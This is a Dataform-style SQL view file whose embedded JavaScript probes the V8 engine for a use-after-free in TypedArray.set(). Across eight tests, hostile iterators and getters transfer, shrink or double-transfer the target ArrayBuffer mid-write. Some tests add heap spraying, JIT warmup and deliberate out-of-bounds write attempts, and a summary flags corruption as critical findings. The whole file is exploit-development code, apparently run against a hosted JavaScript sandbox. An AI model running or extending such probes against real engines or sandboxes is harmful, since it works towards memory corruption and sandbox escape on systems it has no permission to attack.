config { type: "view", name: "v8_set_iterator_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Exploit TypedArray.set() with iterator during buffer transfer - potential UAF"
  };

  // =============================================================================
  // TEST 1: Determine exact moment of transfer during set()
  // =============================================================================
  results.test1_transferTiming = {};
  try {
    const BUFFER_SIZE = 256;
    let transferPoint = -1;
    let writeCount = 0;
    let newBuf = null;

    const buf = new ArrayBuffer(BUFFER_SIZE);
    const view = new Uint8Array(buf);

    // Fill with pattern
    for (let i = 0; i < BUFFER_SIZE; i++) {
      view[i] = 0xAA;
    }

    // Iterator that transfers at specific point
    function* evilIterator(transferAt) {
      for (let i = 0; i < BUFFER_SIZE; i++) {
        if (i === transferAt && !newBuf) {
          newBuf = buf.transfer();
          transferPoint = i;
        }
        writeCount++;
        yield 0xDD;
      }
    }

    let setError = null;
    try {
      view.set(evilIterator(50));
    } catch(e) {
      setError = e.message.substring(0, 100);
    }

    // Check what happened
    const viewAfter = [];
    for (let i = 0; i < Math.min(10, view.length); i++) {
      viewAfter.push(view[i]);
    }

    const newBufView = newBuf ? new Uint8Array(newBuf) : null;
    const newBufContents = newBufView ? Array.from(newBufView.slice(0, 64)) : null;

    results.test1_transferTiming = {
      status: "completed",
      transferPoint,
      writeCount,
      setError,
      viewLengthAfter: view.length,
      bufByteLengthAfter: buf.byteLength,
      viewAfter,
      newBufSize: newBuf ? newBuf.byteLength : null,
      newBufFirst16: newBufContents ? newBufContents.slice(0, 16).map(v => v.toString(16)) : null,
      newBufAt48_56: newBufContents ? newBufContents.slice(48, 56).map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test1_transferTiming = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Multiple buffers - check for cross-buffer write
  // =============================================================================
  results.test2_crossBuffer = {};
  try {
    // Allocate multiple buffers in sequence
    const buffers = [];
    const views = [];

    for (let i = 0; i < 10; i++) {
      const b = new ArrayBuffer(128);
      const v = new Uint8Array(b);
      // Fill with distinct pattern
      for (let j = 0; j < 128; j++) {
        v[j] = (i * 16 + j) & 0xFF;
      }
      buffers.push(b);
      views.push(v);
    }

    // Record initial state
    const initialState = views.map(v => Array.from(v.slice(0, 8)));

    // Target buffer in the middle
    const targetIdx = 5;
    const targetBuf = buffers[targetIdx];
    const targetView = views[targetIdx];

    let transferredBuf = null;
    let writesDone = 0;

    function* crossBufferIterator() {
      for (let i = 0; i < 256; i++) {  // Try to write beyond buffer bounds
        if (i === 32 && !transferredBuf) {
          transferredBuf = targetBuf.transfer();
        }
        writesDone++;
        yield 0xFF;
      }
    }

    let error = null;
    try {
      targetView.set(crossBufferIterator());
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    // Check if adjacent buffers were affected
    const finalState = views.map(v => Array.from(v.slice(0, 8)));
    const bufferChanges = [];
    for (let i = 0; i < views.length; i++) {
      const changed = initialState[i].some((v, j) => v !== finalState[i][j]);
      if (changed) {
        bufferChanges.push({
          bufferIdx: i,
          before: initialState[i].map(v => v.toString(16)),
          after: finalState[i].map(v => v.toString(16))
        });
      }
    }

    results.test2_crossBuffer = {
      status: "completed",
      writesDone,
      error,
      transferredBufSize: transferredBuf ? transferredBuf.byteLength : null,
      targetViewLengthAfter: targetView.length,
      bufferChanges: bufferChanges.length > 0 ? bufferChanges : "none"
    };
  } catch(e) {
    results.test2_crossBuffer = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Heap spray pattern + set() during transfer
  // =============================================================================
  results.test3_heapSpray = {};
  try {
    // Create heap spray objects
    const sprayObjects = [];
    for (let i = 0; i < 100; i++) {
      sprayObjects.push({
        marker: 0xCAFEBABE,
        index: i,
        padding: new Array(32).fill(0xDEADBEEF)
      });
    }

    const targetBuf = new ArrayBuffer(512);
    const targetView = new Uint8Array(targetBuf);
    for (let i = 0; i < 512; i++) {
      targetView[i] = i & 0xFF;
    }

    // Create more spray after target
    for (let i = 0; i < 100; i++) {
      sprayObjects.push({
        marker: 0xBEEFCAFE,
        index: 100 + i,
        padding: new Array(32).fill(0xDEADDEAD)
      });
    }

    let transferred = null;
    let setWrites = 0;

    function* heapSprayIterator() {
      for (let i = 0; i < 2048; i++) {  // Try to write way beyond buffer
        if (i === 100 && !transferred) {
          transferred = targetBuf.transfer();
          // Force GC-like pressure
          for (let j = 0; j < 100; j++) {
            sprayObjects.push({ temp: new Array(100).fill(j) });
          }
        }
        setWrites++;
        yield (i < 256 ? 0xEE : 0xFF);
      }
    }

    let error = null;
    try {
      targetView.set(heapSprayIterator());
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    // Check spray objects for corruption
    let corruptedObjects = 0;
    for (let i = 0; i < Math.min(sprayObjects.length, 200); i++) {
      const obj = sprayObjects[i];
      if (obj.marker !== 0xCAFEBABE && obj.marker !== 0xBEEFCAFE && obj.marker !== undefined) {
        corruptedObjects++;
      }
    }

    results.test3_heapSpray = {
      status: "completed",
      setWrites,
      error,
      sprayObjectsCount: sprayObjects.length,
      corruptedObjects,
      transferredSize: transferred ? transferred.byteLength : null
    };
  } catch(e) {
    results.test3_heapSpray = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: set() with array (not iterator) during transfer
  // =============================================================================
  results.test4_arraySource = {};
  try {
    const buf = new ArrayBuffer(128);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 128; i++) view[i] = i;

    let transferred = null;
    let getCount = 0;

    // Array-like with getter that transfers
    const evilArrayLike = {
      length: 256,
      get [Symbol.iterator]() { return undefined; }  // Force array-like path
    };

    // Add indexed getters
    for (let i = 0; i < 256; i++) {
      Object.defineProperty(evilArrayLike, i, {
        get() {
          getCount++;
          if (i === 32 && !transferred) {
            transferred = buf.transfer();
          }
          return 0xCC;
        }
      });
    }

    let error = null;
    try {
      view.set(evilArrayLike);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test4_arraySource = {
      status: "completed",
      getCount,
      error,
      viewLengthAfter: view.length,
      transferred: !!transferred
    };
  } catch(e) {
    results.test4_arraySource = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: Double transfer - transfer during iteration then again
  // =============================================================================
  results.test5_doubleTransfer = {};
  try {
    let buf = new ArrayBuffer(128);
    const view = new Uint8Array(buf);
    for (let i = 0; i < 128; i++) view[i] = i;

    let transfers = [];
    let writesDone = 0;

    function* doubleTransferIterator() {
      for (let i = 0; i < 256; i++) {
        if (i === 32) {
          try {
            const newBuf = buf.transfer();
            transfers.push({ at: i, size: newBuf.byteLength });
            buf = newBuf;
          } catch(e) {
            transfers.push({ at: i, error: e.message.substring(0, 50) });
          }
        }
        if (i === 64) {
          try {
            const newBuf2 = buf.transfer();
            transfers.push({ at: i, size: newBuf2.byteLength });
            buf = newBuf2;
          } catch(e) {
            transfers.push({ at: i, error: e.message.substring(0, 50) });
          }
        }
        writesDone++;
        yield 0xAB;
      }
    }

    let error = null;
    try {
      view.set(doubleTransferIterator());
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test5_doubleTransfer = {
      status: "completed",
      writesDone,
      transfers,
      error,
      viewLengthAfter: view.length,
      finalBufSize: buf.byteLength
    };
  } catch(e) {
    results.test5_doubleTransfer = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: set() with ResizableArrayBuffer shrink during iteration
  // =============================================================================
  results.test6_resizableShrink = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    let shrinkEvents = [];
    let writesDone = 0;

    function* shrinkIterator() {
      for (let i = 0; i < 256; i++) {
        if (i === 64) {
          try {
            rab.resize(32);  // Shrink way down
            shrinkEvents.push({ at: i, newSize: rab.byteLength });
          } catch(e) {
            shrinkEvents.push({ at: i, error: e.message.substring(0, 50) });
          }
        }
        if (i === 128) {
          try {
            rab.resize(512);  // Grow
            shrinkEvents.push({ at: i, newSize: rab.byteLength });
          } catch(e) {
            shrinkEvents.push({ at: i, error: e.message.substring(0, 50) });
          }
        }
        writesDone++;
        yield 0xBA;
      }
    }

    let error = null;
    try {
      view.set(shrinkIterator());
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const finalViewContent = [];
    for (let i = 0; i < Math.min(16, view.length); i++) {
      finalViewContent.push(view[i]);
    }

    results.test6_resizableShrink = {
      status: "completed",
      writesDone,
      shrinkEvents,
      error,
      viewLengthAfter: view.length,
      bufByteLengthAfter: rab.byteLength,
      finalViewContent: finalViewContent.map(v => v.toString(16))
    };
  } catch(e) {
    results.test6_resizableShrink = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: JIT-optimized set() then trigger with evil iterator
  // =============================================================================
  results.test7_jitSet = {};
  try {
    function setFromIterator(view, iter) {
      view.set(iter);
    }

    // JIT warmup with normal iterators
    for (let i = 0; i < 50000; i++) {
      const buf = new ArrayBuffer(64);
      const view = new Uint8Array(buf);
      setFromIterator(view, [1, 2, 3, 4, 5]);
    }

    // Now use evil iterator
    const targetBuf = new ArrayBuffer(128);
    const targetView = new Uint8Array(targetBuf);
    for (let i = 0; i < 128; i++) targetView[i] = i;

    let transferred = null;
    let writeCount = 0;

    const evilIter = {
      [Symbol.iterator]: function*() {
        for (let i = 0; i < 256; i++) {
          if (i === 32 && !transferred) {
            transferred = targetBuf.transfer();
          }
          writeCount++;
          yield 0xDE;
        }
      }
    };

    let error = null;
    try {
      setFromIterator(targetView, evilIter);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const transferredContent = transferred ?
      Array.from(new Uint8Array(transferred).slice(0, 16)) : null;

    results.test7_jitSet = {
      status: "completed",
      writeCount,
      error,
      viewLengthAfter: targetView.length,
      transferred: !!transferred,
      transferredFirst16: transferredContent ? transferredContent.map(v => v.toString(16)) : null
    };
  } catch(e) {
    results.test7_jitSet = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Float64Array set() - larger element size
  // =============================================================================
  results.test8_float64Set = {};
  try {
    const buf = new ArrayBuffer(128);
    const view = new Float64Array(buf);  // 16 elements
    for (let i = 0; i < 16; i++) view[i] = i + 0.5;

    let transferred = null;
    let writeCount = 0;

    function* float64Iterator() {
      for (let i = 0; i < 64; i++) {  // Try to write 64 elements
        if (i === 4 && !transferred) {
          transferred = buf.transfer();
        }
        writeCount++;
        yield i + 0.123;
      }
    }

    let error = null;
    try {
      view.set(float64Iterator());
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    const transferredView = transferred ? new Float64Array(transferred) : null;

    results.test8_float64Set = {
      status: "completed",
      writeCount,
      error,
      viewLengthAfter: view.length,
      transferred: !!transferred,
      transferredLength: transferredView ? transferredView.length : null,
      transferredFirst4: transferredView ?
        Array.from(transferredView.slice(0, 4)).map(v => v.toFixed(3)) : null
    };
  } catch(e) {
    results.test8_float64Set = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 8,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Analyze findings
  const t1 = results.test1_transferTiming;
  if (t1 && t1.setError === null && t1.writeCount > t1.transferPoint) {
    results.summary.criticalFindings.push(
      "set() continued " + (t1.writeCount - t1.transferPoint) + " writes after transfer"
    );
  }

  const t2 = results.test2_crossBuffer;
  if (t2 && t2.bufferChanges && t2.bufferChanges !== "none") {
    results.summary.criticalFindings.push("Cross-buffer corruption detected!");
  }

  const t3 = results.test3_heapSpray;
  if (t3 && t3.corruptedObjects > 0) {
    results.summary.criticalFindings.push("Heap spray objects corrupted: " + t3.corruptedObjects);
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as set_iterator_exploit
